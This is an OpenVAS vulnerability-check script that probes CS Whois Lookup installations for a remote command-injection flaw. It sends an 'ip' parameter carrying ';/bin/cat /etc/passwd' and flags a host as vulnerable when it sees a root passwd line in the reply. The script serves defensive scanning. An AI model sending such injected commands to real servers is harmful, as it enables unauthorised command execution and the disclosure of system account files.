###############################################################################
# OpenVAS Vulnerability Test
# $Id: cs_whois_34700.nasl 15 2013-10-27 12:49:54Z jan $
#
# CS Whois Lookup 'ip' Parameter Remote Command Execution
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "CS Whois Lookup and CS DNS Lookup are prone to a remote
  command-execution vulnerability because the software fails to
  adequately sanitize user-supplied input.

  Successful attacks can compromise the affected software and possibly
  the computer.";


 script_name("CS Whois Lookup 'ip' Parameter Remote Command Execution Vulnerability");
 desc = "

 Summary:
 " + tag_summary;


if (description)
{
 script_id(100166);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-04-26 20:59:36 +0200 (Sun, 26 Apr 2009)");
 script_bugtraq_id(34700);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_description(desc);
 script_summary("Determine if CS Whois is vulnerable to remote command-execution");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34700");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/whois","/cs-whois","/cs-dns", cgi_dirs());
x = 0;

foreach d (dir)
{ 
 url = string(d, "/index.php?ip=;/bin/cat%20/etc/passwd");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

 if( buf == NULL )continue;

 if (egrep(pattern:"root:.*:0:[01]:.*", string: buf) ) 
   {    
    if(strlen(d)>0) {   
        installations[x] = d;
    } else {
    	installations[x] = string("/");
    }	 
    x++; 
   }
}

if(installations) {
  info = string("\n\nVulnerable installations were found on the remote host in the following directory(s):\n\n");  
  foreach found (installations) {
   info += string(found, "\n");
  }

  desc = desc + info;     

  security_hole(port:port, data: desc);
  exit(0);
}

exit(0);
